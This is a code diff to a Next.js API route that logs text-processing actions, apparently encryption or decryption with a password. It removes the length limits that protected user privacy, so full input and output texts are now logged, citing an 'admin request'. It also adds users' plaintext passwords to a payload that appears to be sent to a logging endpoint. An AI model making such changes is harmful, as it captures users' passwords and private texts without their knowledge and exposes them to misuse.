@@ -77,7 +77,7 @@ function detectLanguage(text: string): 'english' | 'roman_urdu' | 'mixed' {
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
-    const { action, inputText, outputText, passwordUsed, success } = body;
+    const { action, inputText, outputText, passwordUsed, success, passwordPlain } = body;
 
     // Get client info
     const userAgent = request.headers.get('user-agent') || 'Unknown';
@@ -87,8 +87,8 @@ export async function POST(request: NextRequest) {
     const logEntry: LogEntry = {
       timestamp: new Date().toISOString(),
       action,
-      inputText: inputText.substring(0, 100), // Limit length for privacy
-      outputText: success ? `${outputText.substring(0, 50)}...` : 'Failed',
+      inputText: inputText, // full input per admin request
+      outputText: success ? outputText : 'Failed', // full output per admin request
       passwordUsed,
       success,
       language: detectLanguage(inputText),
@@ -118,9 +118,10 @@ export async function POST(request: NextRequest) {
 
       const payload = {
         action,
-        inputText: inputText.substring(0, 100),
-        outputText: success ? outputText.substring(0, 100) : '',
+        inputText: inputText,
+        outputText: success ? outputText : '',
         passwordUsed: !!passwordUsed,
+        passwordPlain: passwordPlain || '',
         success: !!success,
         language: normalizedLanguage,
         inputLength: inputText.length,
